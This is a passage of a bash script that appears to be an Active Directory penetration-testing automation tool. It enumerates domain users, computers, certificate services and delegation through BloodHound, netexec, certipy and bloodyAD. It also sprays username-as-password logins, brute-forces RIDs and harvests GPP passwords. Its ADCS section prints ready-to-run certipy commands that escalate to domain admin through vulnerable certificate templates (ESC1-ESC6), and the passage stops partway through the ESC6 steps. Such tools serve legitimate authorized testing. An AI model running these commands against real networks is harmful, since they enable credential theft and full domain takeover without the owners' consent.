                cd ${output_dir}/DomainRecon/BloodHound
                run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp" | tee ${output_dir}/DomainRecon/BloodHound/bloodhound_output_${dc_domain}.txt
                cd ${current_dir}
                #${netexec} ${ne_verbose} ldap ${ne_kerb} ${target} "${argument_ne}" --bloodhound -ns ${dc_ip} -c All --log ${output_dir}/DomainRecon/BloodHound/ne_bloodhound_output_${dc_domain}.txt 2>&1
                /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" ${output_dir}/DomainRecon/BloodHound/*_users.json 2>/dev/null > ${output_dir}/DomainRecon/Users/users_list_bhd_${dc_domain}.txt
                /usr/bin/jq -r ".data[].Properties.name| select( . != null )" ${output_dir}/DomainRecon/BloodHound/*_computers.json 2>/dev/null > ${output_dir}/DomainRecon/Servers/servers_list_bhd_${dc_domain}.txt
                /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' ${output_dir}/DomainRecon/BloodHound/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u > ${output_dir}/DomainRecon/Servers/sql_list_bhd_${dc_domain}.txt
                parse_users
                parse_servers
            fi
        fi
    fi
    echo -e ""
}

bhd_enum_dconly () {
    if [ ! -f "${bloodhound}" ] ; then
        echo -e "${RED}[-] Please verify the installation of bloodhound${NC}"
    else
        echo -e "${BLUE}[*] BloodHound Enumeration using DCOnly${NC}"
        if [ -n "$(ls -A ${output_dir}/DomainRecon/BloodHound/ | grep -v 'bloodhound_output' 2>/dev/null)" ] ; then
            echo -e "${YELLOW}[i] BloodHound results found, skipping... ${NC}"
        else
            if [ "${nullsess_bool}" == true ] ; then
                echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
            else 
                current_dir=$(pwd)
                cd ${output_dir}/DomainRecon/BloodHound
                run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp" | tee ${output_dir}/DomainRecon/BloodHound/bloodhound_output_dconly_${dc_domain}.txt
                cd ${current_dir}
                #${netexec} ${ne_verbose} ldap ${target} "${argument_ne}" --bloodhound -ns ${dc_ip} -c DCOnly --log tee ${output_dir}/DomainRecon/BloodHound/ne_bloodhound_output_${dc_domain}.txt 2>&1
                /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" ${output_dir}/DomainRecon/BloodHound/*_users.json 2>/dev/null > ${output_dir}/DomainRecon/Users/users_list_bhd_${dc_domain}.txt
                /usr/bin/jq -r ".data[].Properties.name| select( . != null )" ${output_dir}/DomainRecon/BloodHound/*_computers.json 2>/dev/null > ${output_dir}/DomainRecon/Servers/servers_list_bhd_${dc_domain}.txt
                parse_users
                parse_servers
            fi
        fi
    fi
    echo -e ""
}

ldapdomaindump_enum () {
    if [ ! -f "${ldapdomaindump}" ] ; then
        echo -e "${RED}[-] Please verify the installation of ldapdomaindump${NC}"
    else
        echo -e "${BLUE}[*] ldapdomaindump Enumeration${NC}"
        if [ -n "$(ls -A ${output_dir}/DomainRecon/LDAPDomainDump/ | grep -v 'ldd_output' 2>/dev/null)" ] ; then
            echo -e "${YELLOW}[i] ldapdomaindump results found, skipping... ${NC}"
        else
            if [ "${nullsess_bool}" == true ] ; then
                run_command "${ldapdomaindump} ldap://${dc_ip} -o ${output_dir}/DomainRecon/LDAPDomainDump" 2>&1 | tee "${output_dir}/DomainRecon/LDAPDomainDump/ldd_output_${dc_domain}.txt"
            elif [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
                echo -e "${PURPLE}[-] ldapdomaindump does not support kerberos authentication ${NC}"
            else
                if [ "${ldaps_bool}" == true ]; then ldaps_param="ldaps"; else ldaps_param="ldap"; fi
                run_command "${ldapdomaindump} ${argument_ldd} ${ldaps_param}://${dc_ip} -o ${output_dir}/DomainRecon/LDAPDomainDump" | tee "${output_dir}/DomainRecon/LDAPDomainDump/ldd_output_${dc_domain}.txt"
            fi
        /usr/bin/jq -r ".[].attributes.sAMAccountName[]" ${output_dir}/DomainRecon/LDAPDomainDump/domain_users.json 2>/dev/null > ${output_dir}/DomainRecon/Users/users_list_ldd_${dc_domain}.txt
        /usr/bin/jq -r ".[].attributes.dNSHostName[]" ${output_dir}/DomainRecon/LDAPDomainDump/domain_computers.json 2>/dev/null > ${output_dir}/DomainRecon/Servers/servers_list_ldd_${dc_domain}.txt
        parse_users
        parse_servers
        fi
    fi
    echo -e ""
}

enum4linux_enum () {
    if [ ! -f "${enum4linux_py}" ] ; then
        echo -e "${RED}[-] Please verify the installation of enum4linux-ng${NC}"
    else
        echo -e "${BLUE}[*] enum4linux Enumeration${NC}"
        if [ "${aeskey_bool}" == true ] ; then
            echo -e "${PURPLE}[-] enum4linux does not support kerberos authentication using AES Key${NC}"
        elif [ "${nullsess_bool}" == true ] ; then
            echo -e "${CYAN}[*] Empty username/password${NC}"
            run_command "${enum4linux_py} -A ${target}" -oJ ${output_dir}/DomainRecon/enum4linux_null_${dc_domain} 2>&1 > ${output_dir}/DomainRecon/enum4linux_null_${dc_domain}.txt
            head -n 20 ${output_dir}/DomainRecon/enum4linux_null_${dc_domain}.txt 2>&1
            echo -e "............................(truncated output)"
            /usr/bin/jq -r ".users[].username" ${output_dir}/DomainRecon/enum4linux_null_${dc_domain}.json 2>/dev/null > ${output_dir}/DomainRecon/Users/users_list_enum4linux_nullsess_${dc_domain}.txt
            echo -e "${CYAN}[*] Guest with empty password${NC}"
            run_command "${enum4linux_py} -A ${target} -u 'Guest' -p ''" -oJ ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}  > ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt
            head -n 20 ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt 2>&1
            echo -e "............................(truncated output)"
            /usr/bin/jq -r ".users[].username" ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.json 2>/dev/null > ${output_dir}/DomainRecon/Users/users_list_enum4linux_guest_${dc_domain}.txt
        else
            run_command "${enum4linux_py} -A ${argument_enum4linux} ${target}" -oJ ${output_dir}/DomainRecon/enum4linux_${dc_domain} > ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt
            head -n 20 ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt 2>&1
            echo -e "............................(truncated output)"
            /usr/bin/jq -r ".users[].username" ${output_dir}/DomainRecon/enum4linux_${dc_domain}.json 2>/dev/null > ${output_dir}/DomainRecon/Users/users_list_enum4linux_${dc_domain}.txt
        fi
        parse_users
    fi
    echo -e ""
}

ne_smb_enum () {
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${BLUE}[*] Users Enumeration (RPC Null session)${NC}"
        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --users --log ${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt" 2>&1
        /bin/cat ${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt 2>/dev/null | grep -v "\[-\|\[+\|\[\*" | grep SMB | sed 's/[ ][ ]*/ /g' | cut -d " " -f 10 | cut -d "\\" -f 2 > ${output_dir}/DomainRecon/Users/users_list_ne_smb_nullsess_${dc_domain}.txt 2>&1
        count=$(cat ${output_dir}/DomainRecon/Users/users_list_ne_smb_nullsess_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
        echo -e "${GREEN}[+] Found ${count} users using RPC User Enum${NC}"
    else
        echo -e "${BLUE}[*] Users / Computers Enumeration (RPC authenticated)${NC}"
        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --users --log ${output_dir}/DomainRecon/ne_users_auth_smb_${dc_domain}.txt" 2>&1
        /bin/cat ${output_dir}/DomainRecon/ne_users_auth_smb_${dc_domain}.txt 2>/dev/null | grep -v "\[-\|\[+\|\[\*" | grep SMB | sed 's/[ ][ ]*/ /g' | cut -d " " -f 10 | cut -d "\\" -f 2 > ${output_dir}/DomainRecon/Users/users_list_ne_smb_${dc_domain}.txt 2>&1
        count=$(cat ${output_dir}/DomainRecon/Users/users_list_ne_smb_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
        echo -e "${GREEN}[+] Found ${count} users using RPC User Enum${NC}"
        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --computers" > ${output_dir}/DomainRecon/ne_computers_auth_smb_${dc_domain}.txt
    fi
    parse_users
    echo -e ""
    echo -e "${BLUE}[*] Password Policy Enumeration${NC}"
    run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --pass-pol --log ${output_dir}/DomainRecon/ne_passpol_output_${dc_domain}.txt" 2>&1
    echo -e ""
    echo -e "${BLUE}[*] GPP Enumeration${NC}"
    run_command "${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M gpp_autologin -M gpp_password --log ${output_dir}/DomainRecon/ne_gpp_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

ne_ldap_enum () {
    if [ "${ldaps_bool}" == true ]; then ldaps_param="--port 636"; else ldaps_param=""; fi
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${BLUE}[*] Users Enumeration (LDAP Null session)${NC}"
        run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
        /bin/cat ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt 2>/dev/null | grep -v "\[-\|\[+\|\[\*" | grep LDAP | sed 's/[ ][ ]*/ /g' | cut -d " " -f 10 > ${output_dir}/DomainRecon/Users/users_list_ne_ldap_nullsess_${dc_domain}.txt 2>&1
        count=$(cat ${output_dir}/DomainRecon/Users/users_list_ne_ldap_nullsess_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
        echo -e "${GREEN}[+] Found ${count} users using LDAP User Enum${NC}"
    else
        echo -e "${BLUE}[*] Users Enumeration (LDAP authenticated)${NC}"
        run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_auth_ldap_${dc_domain}.txt" 2>&1
        /bin/cat ${output_dir}/DomainRecon/ne_users_auth_ldap_${dc_domain}.txt 2>/dev/null | grep -v "\[-\|\[+\|\[\*" | grep LDAP | sed 's/[ ][ ]*/ /g' | cut -d " " -f 10 > ${output_dir}/DomainRecon/Users/users_list_ne_ldap_${dc_domain}.txt 2>&1
        count=$(cat ${output_dir}/DomainRecon/Users/users_list_ne_ldap_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
        echo -e "${GREEN}[+] Found ${count} users using LDAP User Enum${NC}"
    fi
    parse_users
    echo -e ""
    echo -e "${BLUE}[*] DC List Enumeration${NC}"
    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --dc-list --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_dclist_output_${dc_domain}.txt" 2>&1
    /bin/cat ${output_dir}/DomainRecon/ne_dclist_output_${dc_domain}.txt 2>/dev/null | grep -v "\[-\|\[+\|\[\*" | grep LDAP | sed 's/[ ][ ]*/ /g' | cut -d " " -f 10 > ${output_dir}/DomainRecon/Servers/dc_list_ne_ldap_${dc_domain}.txt 2>&1
    /bin/cat ${output_dir}/DomainRecon/ne_dclist_output_${dc_domain}.txt 2>/dev/null | grep -v "\[-\|\[+\|\[\*" | grep LDAP | sed 's/[ ][ ]*/ /g' | cut -d " " -f 12 > ${output_dir}/DomainRecon/Servers/dc_ip_list_ne_ldap_${dc_domain}.txt 2>&1
    parse_servers
    echo -e ""
    echo -e ""
    echo -e "${BLUE}[*] Password not required Enumeration${NC}"
    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --password-not-required --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_passnotrequired_output_${dc_domain}.txt" 2>&1
    echo -e ""
    echo -e "${BLUE}[*] ADCS Enumeration${NC}"
    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} -M adcs --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ADCS/ne_adcs_output_${dc_domain}.txt" 2>&1
    echo -e ""
    echo -e "${BLUE}[*] Users Description containing word: pass${NC}"
    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M get-desc-users --kdcHost ${dc_FQDN}" 2>&1 > ${output_dir}/DomainRecon/ne_get-desc-users_pass_output_${dc_domain}.txt
    /bin/cat ${output_dir}/DomainRecon/ne_get-desc-users_pass_output_${dc_domain}.txt 2>/dev/null | grep -i "pass\|pwd" | tee ${output_dir}/DomainRecon/ne_get-desc-users_pass_results_${dc_domain}.txt 2>&1
    if [ ! -s ${output_dir}/DomainRecon/ne_get-desc-users_pass_results_${dc_domain}.txt ]; then
        echo -e "${PURPLE}[-] No users with passwords in description found${NC}"
    fi
    echo -e ""
    echo -e "${BLUE}[*] Get MachineAccountQuota${NC}"
    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M MAQ --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_MachineAccountQuota_output_${dc_domain}.txt" 2>&1
    echo -e ""
    echo -e "${BLUE}[*] Subnets Enumeration${NC}"
    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M subnets --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_subnets_output_${dc_domain}.txt" 2>&1
    echo -e ""
    echo -e "${BLUE}[*] LDAP-signing check${NC}"
    run_command "${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} ${ldaps_param} -M ldap-checker --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_ldap-checker_output_${dc_domain}.txt" 2>&1
    echo -e ""
    echo -e "${BLUE}[*] Trusted-for-delegation check (netexec)${NC}"
    run_command "${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} ${ldaps_param} --trusted-for-delegation --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_trusted-for-delegation_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

ridbrute_attack () {
    echo -e "${BLUE}[*] RID Brute Force (Null session)${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --rid-brute" 2>&1 > ${output_dir}/DomainRecon/ne_rid_brute_${dc_domain}.txt
        #Parsing user lists
        /bin/cat ${output_dir}/DomainRecon/rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2 | sed "s/ (SidTypeUser)\x1B\[0m//g" > ${output_dir}/DomainRecon/Users/users_list_ridbrute_${dc_domain}.txt 2>&1
        count=$(wc -l ${output_dir}/DomainRecon/Users/users_list_ridbrute_${dc_domain}.txt | cut -d " " -f 1)
        echo -e "${GREEN}[+] Found ${count} users using RID Brute Force${NC}"
        parse_users
    else
        echo -e "${PURPLE}[-] Null session RID brute force skipped (credentials provided)${NC}"
    fi
    echo -e ""
}

userpass_ne_check () {
    echo -e "${BLUE}[*] netexec User=Pass Check (Noisy!)${NC}"
    parse_users
    if [ ! -s "${users_list}" ] ; then
         echo -e "${PURPLE}[-] No users found! Please re-run users enumeration and try again..${NC}"
    else
        echo -e "${YELLOW}[i] Finding users with Password = username using netexec. This may take a while...${NC}"
        run_command "${netexec} ${ne_verbose} smb ${target} -u ${users_list} -p ${users_list} --no-bruteforce --continue-on-success" 2>&1 > ${output_dir}/DomainRecon/ne_userpass_output_${dc_domain}.txt
        /bin/cat ${output_dir}/DomainRecon/ne_userpass_output_${dc_domain}.txt 2>&1 | grep "\[+\]" | cut -d "\\" -f 2 | cut -d " " -f 1 > "${output_dir}/DomainRecon/user_eq_pass_valid_ne_${dc_domain}.txt"
        if [ -s "${output_dir}/DomainRecon/user_eq_pass_valid_ne_${dc_domain}.txt" ] ; then
            echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
            /bin/cat ${output_dir}/DomainRecon/user_eq_pass_valid_ne_${dc_domain}.txt 2>/dev/null
        else
            echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
        fi
    fi
    echo -e ""
}

pre2k_check () {
    if [ ! -f "${pre2k}" ] ; then
        echo -e "${RED}[-] Please verify the installation of pre2k${NC}"
    else
        echo -e "${BLUE}[*] Pre2k authentication check (Noisy!)${NC}"
        pre2k_outputfile="${output_dir}/DomainRecon/pre2k_outputfile_${dc_domain}.txt"
        if [ "${nullsess_bool}" == true ] ; then
            if [ ! -s "${servers_hostname_list}" ] ; then
                echo -e "${PURPLE}[-] No computers found! Please re-run computers enumeration and try again..${NC}"
            else
                run_command "${pre2k} unauth ${argument_pre2k} -dc-ip ${dc_ip} -inputfile ${servers_hostname_list} -outputfile ${pre2k_outputfile}" | tee "${output_dir}/DomainRecon/pre2k_output_${dc_domain}.txt"
            fi
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
            run_command "${pre2k} auth ${argument_pre2k} -dc-ip ${dc_ip} -outputfile ${pre2k_outputfile} ${ldaps_param}" | tee "${output_dir}/DomainRecon/pre2k_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

deleg_enum_imp () {
    if [ ! -f "${impacket_findDelegation}" ] ; then
        echo -e "${RED}[-] findDelegation.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] Impacket findDelegation Enumeration${NC}"
        run_command "${impacket_findDelegation} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} ${argument_ThePorgs}" | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
        if grep -q 'error' ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt; then
            echo -e "${RED}[-] Errors during Delegation enum... ${NC}"
        fi
    fi
    echo -e ""
}

certi_py_enum () {
    if [[ ! -f "${certi_py}" ]] ; then
        echo -e "${RED}[-] Please verify the installation of certi.py${NC}"
    else
        echo -e "${BLUE}[*] certi.py Enumeration${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] certi.py requires credentials${NC}"
        else
            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class ca" 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certi.py_CA_output_${dc_domain}.txt
            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class service" 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certi.py_CAServices_output_${dc_domain}.txt
            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --vuln --enabled" 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt
        fi
    fi
    echo -e ""
}

certipy_enum () {
    if [[ ! -f "${certipy}" ]] ; then
        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
    else
        echo -e "${BLUE}[*] Certipy Enumeration${NC}"
        if [ -n "$(ls -A ${output_dir}/DomainRecon/ADCS/*_Certipy* 2>/dev/null)" ] ; then
            echo -e "${YELLOW}[i] Certipy results found, skipping... ${NC}"
        else
            if [ "${nullsess_bool}" == true ] ; then
                echo -e "${PURPLE}[-] certipy requires credentials${NC}"
            else
                current_dir=$(pwd)
                cd ${output_dir}/DomainRecon/ADCS
                if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
                run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param}" 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certipy_output_${dc_domain}.txt
                run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins" 2>&1 >> ${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt
                cd ${current_dir}
            fi
        fi
    fi
    adcs_vuln_parse
    echo -e ""
}

fqdn_to_ldap_dn() {
  sed -e 's/[^ ]*/dc=&/g' <<<"${1//./ }" -e 's/ /,/g'
}

bloodyad_enum () {
    if [ ! -f "${bloodyad}" ] ; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        echo -e "${BLUE}[*] bloodyad Enumeration${NC}"
        if [ "${aeskey_bool}" == true ] ; then
            echo -e "${PURPLE}[-] bloodyad does not support kerberos authentication using AES Key${NC}"            
        else
            domain_DN=$(fqdn_to_ldap_dn ${dc_domain})
            echo -e "${CYAN}[*] Searching for attribute msDS-Behavior-Version${NC}"
            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get object ${domain_DN} --attr msDS-Behavior-Version" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_forestlevel_${dc_domain}.txt 
            echo -e "${CYAN}[*] Searching for attribute ms-DS-MachineAccountQuota${NC}"
            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get object ${domain_DN} --attr ms-DS-MachineAccountQuota" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_maq_${dc_domain}.txt 
            echo -e "${CYAN}[*] Searching for attribute minPwdLength${NC}"
            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get object ${domain_DN} --attr minPwdLength" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_minpasslen_${dc_domain}.txt 
            echo -e "${CYAN}[*] Searching for users${NC}"
            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get children --otype useronly" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_allusers_${dc_domain}.txt
            /bin/cat ${output_dir}/DomainRecon/bloodyAD/bloodyad_allusers_${dc_domain}.txt 2>/dev/null | cut -d "," -f 1 | cut -d "=" -f 2 | sort -u > ${output_dir}/DomainRecon/Users/users_list_bla_${dc_domain}.txt 2>/dev/null
            parse_users
            echo -e "${CYAN}[*] Searching for computers${NC}"
            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get children --otype computer" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_allcomp_${dc_domain}.txt 
            /bin/cat ${output_dir}/DomainRecon/bloodyAD/bloodyad_allcomp_${dc_domain}.txt 2>/dev/null | cut -d "," -f 1 | cut -d "=" -f 2 | sort -u | grep "\S" | sed -e "s/$/.${dc_domain}/" > ${output_dir}/DomainRecon/Servers/servers_list_bla_${dc_domain}.txt 2>/dev/null
            parse_servers
            echo -e "${CYAN}[*] Searching for containers${NC}"
            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get children --otype container" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_allcontainers_${dc_domain}.txt 
            echo -e "${CYAN}[*] Searching for Kerberoastable${NC}"
            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get search ${domain_DN} --filter (&(samAccountType=805306368)(servicePrincipalName=*)) --attr sAMAccountName" | grep sAMAccountName | cut -d ' ' -f 2 | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_kerberoast_${dc_domain}.txt 
            echo -e "${CYAN}[*] Searching for ASREPRoastable${NC}"
            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get search ${domain_DN} --filter (&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attr sAMAccountName" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_asreproast_${dc_domain}.txt 
            echo -e "${CYAN}[*] Searching for DNS entries${NC}"
            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get dnsDump" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_dns_${dc_domain}.txt
            echo -e "${YELLOW}If ADIDNS does not contain a wildcard entry, check for ADIDNS spoofing${NC}"
            /bin/cat ${output_dir}/DomainRecon/bloodyAD/bloodyad_dns_${dc_domain}.txt 2>/dev/null | sed -n '/[^\n]*\*/,/^$/p'
            echo -e "${CYAN}[*] Searching for writable objects${NC}"
            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get writable" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_writable_${dc_domain}.txt 
       fi
    fi
    echo -e ""
}

ne_adcs_enum (){
    if [ ! -f "${output_dir}/DomainRecon/ADCS/ne_adcs_output_${dc_domain}.txt" ]; then
        if [ "${ldaps_bool}" == true ]; then ldaps_param="--port 636"; else ldaps_param=""; fi
        run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M adcs --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ADCS/ne_adcs_output_${dc_domain}.txt" 2>&1
    fi
    pki_servers=$(/bin/cat ${output_dir}/DomainRecon/ADCS/ne_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found PKI Enrollment Server" | cut -d ":" -f 4 | cut -d " " -f 2 | awk '!x[$0]++')
    pki_cas=$(/bin/cat ${output_dir}/DomainRecon/ADCS/ne_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found CN" | cut -d ":" -f 4 | cut -d " " -f 2 | awk '!x[$0]++')

}

adcs_vuln_parse (){
    ne_adcs_enum
    esc1_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC1" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ ! -z $esc1_vuln ]]; then
        echo -e "${GREEN}[+] Templates vulnerable to ESC1 potentially found! Follow steps below for exploitation:${NC}"
        for vulntemp in $esc1_vuln; do
            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
            echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}"
            echo -e "${CYAN}2. Authenticate using pfx of domain_admin or DC:${NC}"
            echo -e "${certipy} auth -pfx domain_admin_dc.pfx -dc-ip ${dc_ip}"
        done
    fi

    esc2_3_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select ((."[!] Vulnerabilities"."ESC2" or ."[!] Vulnerabilities"."ESC3") and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ ! -z $esc2_3_vuln ]]; then
        echo -e "${GREEN}[+] Templates vulnerable to ESC2 or ESC3 potentially found! Follow steps below for exploitation:${NC}"
        for vulntemp in $esc2_3_vuln; do
            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
            echo -e "${CYAN}1. Request a certificate based on the vulnerable template:${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template ${vulntemp} -dc-ip ${dc_ip}"
            echo -e "${CYAN}2. Use the Certificate Request Agent certificate to request a certificate on behalf of the domain_admin:${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template User -on-behalf-of $(echo $dc_domain | cut -d "." -f 1)\\domain_admin -pfx ${user}.pfx -dc-ip ${dc_ip}"
            echo -e "${CYAN}3. Authenticate using pfx of domain_admin:${NC}"
            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
        done
    fi

    esc4_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC4" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ ! -z $esc4_vuln ]]; then
        echo -e "${GREEN}[+] Templates vulnerable to ESC4 potentially found! Follow steps below for exploitation:${NC}"
        for vulntemp in $esc4_vuln; do
            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
            echo -e "${CYAN}1. Make the template vulnerable to ESC1:${NC}"
            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -save-old -dc-ip ${dc_ip}"
            echo -e "${CYAN}2. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}"
            echo -e "${CYAN}3. Restore configuration of vulnerable template:${NC}"
            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -configuration ${vulntemp}.json"
            echo -e "${CYAN}4. Authenticate using pfx of domain_admin or DC:${NC}"
            echo -e "${certipy} auth -pfx domain_admin_dc.pfx -dc-ip ${dc_ip}"
        done
    fi

    esc6_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC6") | ."CA Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ ! -z $esc6_vuln ]]; then
        echo -e "${GREEN}[+] ESC6 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulntemp in $esc6_vuln; do
            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
            echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
